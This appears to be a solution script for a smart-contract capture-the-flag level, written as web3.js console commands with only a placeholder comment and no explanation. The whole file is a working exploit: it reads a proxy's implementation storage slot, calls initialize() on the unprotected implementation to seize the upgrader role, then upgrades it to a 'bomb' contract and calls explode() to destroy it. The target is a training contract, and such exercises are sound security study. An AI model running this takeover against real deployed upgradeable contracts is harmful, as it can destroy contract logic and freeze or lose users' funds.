/*
    Must read the required reading material given in the level

    // Explaination will be done soon
*/

implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

implAddr = '0x' + implAddr.slice(-40)

initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData})

upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()") 

await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase() 

bombAddr = "0x4EC0737514BB505c8b9805275bb1E2a5570859c0" 

explodeData = web3.eth.abi.encodeFunctionSignature("explode()") 

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData] 

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams) 

await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 

